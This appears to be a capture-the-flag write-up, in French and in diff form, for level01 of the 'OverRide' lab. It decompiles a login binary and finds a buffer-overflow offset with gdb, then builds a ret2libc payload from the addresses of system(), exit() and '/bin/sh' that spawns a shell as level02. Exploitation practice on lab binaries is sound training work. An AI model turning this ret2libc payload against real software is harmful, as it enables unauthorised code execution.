@@ -1,0 +1,167 @@
+HEX RAYS :
+
+//----- (08048464) --------------------------------------------------------
+_BOOL4 verify_user_name()
+{
+  puts("verifying username....\n");
+  return memcmp(a_user_name, "dat_wil", 7u) != 0;
+}
+
+//----- (080484A3) --------------------------------------------------------
+_BOOL4 __cdecl verify_user_pass(const void *a1)
+{
+  return memcmp(a1, "admin", 5u) != 0;
+}
+
+//----- (080484D0) --------------------------------------------------------
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
+  _BOOL4 v5; // [esp+5Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  v5 = 0;
+  puts("********* ADMIN LOGIN PROMPT *********");
+  printf("Enter Username: ");
+  fgets(a_user_name, 256, stdin);
+  v5 = verify_user_name();
+  if ( v5 )
+  {
+    puts("nope, incorrect username...\n");
+  }
+  else
+  {
+    puts("Enter Password: ");
+    fgets(s, 100, stdin);
+    v5 = verify_user_pass(s);
+    puts("nope, incorrect password...\n");
+  }
+  return 1;
+}
+
+Faire des tests avec des suites de caracteres (pour username, commencer par "dat_wil")  
+
+On repere l''adresse de la globale user_name : 
+- Dans le code ASM pour le premier fgets:
+  0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
+  0x08048528 <+88>:	call   0x8048370 <fgets@plt>
+- Ou grace a info variables:
+  (gdb) info variable a_user_name
+  All variables matching regular expression "a_user_name":
+  Non-debugging symbols:
+  0x0804a040  a_user_name
+On checke avec AAAA dans le user_name:
+  (gdb) x/4s 0x0804a040
+  0x804a040 <a_user_name>:	 "AAAAAAAA\n"
+
+ret2libc
+// On repere l'adresse de system()
+(gdb) p system
+$17 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+// On repere la chaine /bin/sh
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec          <--------------------------
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+
+---------------TROUVER SEIP(RETURN)----------------------------
+Pour trouver la dimension du buffer overflow de password on utilise le pattern_generator:
+``` bash
+➜  OverRide git:(main) ✗ ./pattern_generator.py 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+(gdb) r < <(python -c 'print("dat_wil")'; python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A") ')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level01/level01 < <(python -c 'print("dat_wil")'; python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A") ')
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+➜  OverRide git:(main) ✗ ./pattern_generator.py --offset 37634136  
+Exact match at offset 80
+```
+
+Dans GDB, on retrouve les addresses de `system()`, `exit()`, `"/bin/sh"`
+``` bash
+(gdb) p system
+$11 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$12 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) info proc maps
+Too many parameters: maps
+(gdb) info proc map
+process 1805
+Mapped address spaces:
+
+Start Addr   End Addr       Size     Offset objfile
+0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+0xf7e2b000 0xf7e2c000     0x1000        0x0 
+0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+0xf7fd0000 0xf7fd4000     0x4000        0x0 
+0xf7fd8000 0xf7fdb000     0x3000        0x0 
+0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+```
+
+Une maniere alternative de trouver "/bin/sh":
+// On repere la chaine /bin/sh
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec          <--------------------------
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+on resume :
+taille pour buffer overflow : 80
+addr de system :              0xf7e6aed0
+addr de exit :                0xf7e5eb70
+addr de "/bin/sh":            0xf7f897ec
+```
+On construit le payload
+(python -c 'print("dat_wil")'; python -c 'print("A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]) '; cat) | ./level01
+----LAUNCHING-----
+level01@OverRide:~$ (python -c 'print("dat_wil")'; python -c 'print("A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]) '; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+
+------------OTHER WAYS TO FIND THE ADDRESSES-----------------
+On se prepare pour ret2libc
+1/ On utilise `ldd` pour savoir quelles bibiotheques sont chargees et leur adresse memoire (on cherche la libc):
+level01@OverRide:~$ ldd level01 
+	linux-gate.so.1 =>  (0xf7ffd000)
+	libc.so.6 => /lib32/libc.so.6 (0xf7e4e000)
+	/lib/ld-linux.so.2 (0x56555000)
+2/ On cherche l''adresse de system
+``` bash
+level01@OverRide:~$ readelf -s /lib32/libc.so.6 | grep system
+   239: 0011ca50    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
+   615: 0003eed0   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+  1422: 0003eed0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+```
+3/ On cherche l''adresse de ".bin/sh" grace a strings
+``` bash
+level01@OverRide:~$ strings -tx /lib32/libc.so.6 | grep "/bin/sh"
+ 15d7ec /bin/sh
+```
